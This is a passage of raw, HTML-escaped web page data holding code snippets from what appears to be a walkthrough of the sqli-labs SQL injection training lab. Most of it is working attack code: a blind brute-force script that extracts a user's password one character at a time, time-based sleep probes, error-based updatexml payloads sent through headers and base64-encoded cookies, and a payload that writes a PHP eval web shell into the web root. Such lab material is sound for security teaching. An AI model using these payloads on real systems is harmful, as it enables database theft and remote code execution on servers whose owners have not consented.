class=\"token string\"\u003e\"Less-9\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1' AND 1=0 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 744\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-9\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1' AND 1=1 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 707\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ebrute_force\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e127\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e,1))=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e -- \"\u003c/span\u003e\u003c/span\u003e\n        resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-9\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e707\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e i\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1f:Tb71,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-10\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'?id=1\" AND 1=0 -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 746\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-10\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'?id=1\" AND 1=1 -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 709\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ebrute_force\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e127\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef'?id=1\" AND ascii(substr((SELECT password FROM security.users WHERE username=\"Angelina\"),\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e,1))=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e -- '\u003c/span\u003e\u003c/span\u003e\n        resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-10\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e709\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e i\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"20:T6d9,root \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003er\"C:\\\\path\\\\to\\\\WWW\\\\sqli-labs\\\\Less-7\\\\\"\u003c/span\u003e\n\nshell \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'\u0026lt;?php @eval($_GET[\"cmd\"]); ?\u003e'\u003c/span\u003e\nshell_hex \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"0x\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e shell\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token builtin\"\u003ehex\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nshell_path \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e root \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"shell.php\"\u003c/span\u003e\n\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"?id=x')) UNION SELECT '','',\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003eshell_hex\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e INTO OUTFILE '\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003eshell_path\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e' -- \"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# ?id=x')) UNION SELECT '','',0x3c3f70687020406576616c28245f4745545b22636d64225d293b203f3e INTO OUTFILE '...' --\u003c/span\u003e\n\nquery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-7\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n21:Tc68,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e query \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e requests\n\npayloads \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e'x\"   OR sleep(10) -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e'x\")  OR sleep(10) -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e'x\")) OR sleep(10) -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e\"x'   OR sleep(10) -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e\"x')  OR sleep(10) -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"token string\"\u003e\"x')) OR sleep(10) -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e payload \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e payloads\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-15\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e timeout\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e requests\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eexceptions\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eTimeout\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"[*] Vulnerable payload:\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# [*] Vulnerable payload: x'   OR sleep(10) --\u003c/span\u003e\n\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x' OR 1=1 -- \"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-15\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"22:T40c,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x', 0, updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #\"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-18\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e headers\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"User-Agent\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n23:T406,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x', updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #\"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-19\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e headers\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Referer\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan c"])</script><script>self.__next_f.push([1,"lass=\"token punctuation\"\u003e)\u003c/span\u003e\n24:T405,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #\"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-20\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e cookies\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n25:T5bf,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"x') OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #\"\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e base64\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eb64encode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003edecode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-21\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/spa"])</script><script>self.__next_f.push([1,"n\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e cookies\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n26:T4f8,\u003cspan class=\"token variable\"\u003e$cookee\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_COOKIE\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'uname'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$cookee\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003ebase64_decode\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$cookee\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$cookee1\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'\"'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e.\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$cookee\u003c/span\u003e \u003cspan class=\"token operator\"\u003e.\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'\"'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users WHERE username=\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$cookee1\u003c/span\u003e\u003c/span\u003e LIMIT 0,1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n27:T5be,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'x\" OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #'\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e base64\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eb64encode\u003cspan cla"])</script><script>self.__next_f.push([1,"ss=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003edecode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_post\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-22\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"passwd\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"admin\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e cookies\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"uname\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n28:T7fd,\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'id'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$reg\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"/#/\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$reg1\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"/--/\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$replace\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuat"])</script><script>self.__next_f.push([1,"ion\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$reg\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token 